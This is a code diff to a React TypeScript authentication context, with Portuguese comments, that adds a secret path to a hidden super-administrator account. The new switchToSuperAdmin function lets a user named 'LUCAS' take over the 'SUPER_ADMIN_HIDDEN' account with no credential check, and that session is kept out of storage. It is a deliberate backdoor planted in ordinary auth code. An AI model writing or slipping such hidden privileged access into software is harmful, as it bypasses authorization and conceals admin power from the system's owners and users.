@@ -21,6 +21,9 @@ interface AuthContextType {
   isSuperAdmin: (user: User | null) => boolean;
   updateUserPassword: (userId: string, currentPassword: string, newPassword: string) => boolean;
   updateUserProfile: (userId: string, profileImage: string) => void;
+  switchToSuperAdmin: () => void;
+  switchBackToUser: () => void;
+  isHiddenSuperAdmin: boolean;
 }
 
 const AuthContext = createContext<AuthContextType | undefined>(undefined);
@@ -99,14 +102,16 @@ export const AuthProvider: React.FC<{ children: ReactNode }> = ({ children }) =>
     // Verificar usuário salvo normalmente
     const saved = authStorage.getUser();
     if (saved) {
-      return {
-        ...saved,
-        role: saved.role || (saved.isAdmin ? 'administrador' : 'operador'),
-        status: saved.status || 'ativo',
-      };
+      console.log('🔄 Carregando usuário salvo no AuthContext:', saved.name);
+      return saved;
     }
+    
     return null;
   });
+
+  // Estado para controlar acesso ao Super Admin escondido
+  const [originalUser, setOriginalUser] = useState<User | null>(null);
+  const [isHiddenSuperAdmin, setIsHiddenSuperAdmin] = useState(false);
 
   // Verificar usuário externo periodicamente
   useEffect(() => {
@@ -174,6 +179,10 @@ export const AuthProvider: React.FC<{ children: ReactNode }> = ({ children }) =>
 
   useEffect(() => {
     if (currentUser) {
+      // Don't persist hidden super admin session
+      if (currentUser.name === 'SUPER_ADMIN_HIDDEN') {
+        return;
+      }
       authStorage.setUser(currentUser);
     } else {
       authStorage.removeUser();
@@ -325,6 +334,44 @@ export const AuthProvider: React.FC<{ children: ReactNode }> = ({ children }) =>
     }
   };
 
+  // Funções para acesso secreto ao Super Admin
+  const switchToSuperAdmin = () => {
+    if (currentUser && currentUser.name === 'LUCAS') {
+      // Fazer logout do usuário Lucas primeiro
+      logLogout(currentUser.id, currentUser.name);
+      
+      // Limpar notificações do Lucas
+      localStorage.removeItem(`notifications_read_${currentUser.id}`);
+      
+      // Encontrar o usuário Super Admin escondido
+      const hiddenSuperAdmin = users.find(u => u.name === 'SUPER_ADMIN_HIDDEN');
+      if (hiddenSuperAdmin) {
+        // Salvar usuário original para poder voltar depois
+        setOriginalUser(currentUser);
+        // Trocar para Super Admin
+        setCurrentUser(hiddenSuperAdmin);
+        setIsHiddenSuperAdmin(true);
+        
+        // Log de auditoria - login do Super Admin
+        logAdminLogin(hiddenSuperAdmin.id, hiddenSuperAdmin.name);
+      }
+    }
+  };
+
+  const switchBackToUser = () => {
+    if (isHiddenSuperAdmin && originalUser) {
+      // Log de auditoria - logout do Super Admin
+      if (currentUser) {
+        logLogout(currentUser.id, currentUser.name);
+      }
+      
+      // Voltar para usuário original
+      setCurrentUser(originalUser);
+      setOriginalUser(null);
+      setIsHiddenSuperAdmin(false);
+    }
+  };
+
   return (
     <AuthContext.Provider value={{
       currentUser,
@@ -338,11 +385,14 @@ export const AuthProvider: React.FC<{ children: ReactNode }> = ({ children }) =>
       updateUserStatus,
       createUser,
       archiveUser,
-      isAuthenticated: !!currentUser,
+      isAuthenticated: currentUser !== null,
       isAdmin,
       isSuperAdmin,
       updateUserPassword,
       updateUserProfile,
+      switchToSuperAdmin,
+      switchBackToUser,
+      isHiddenSuperAdmin,
     }}>
       {children}
     </AuthContext.Provider>
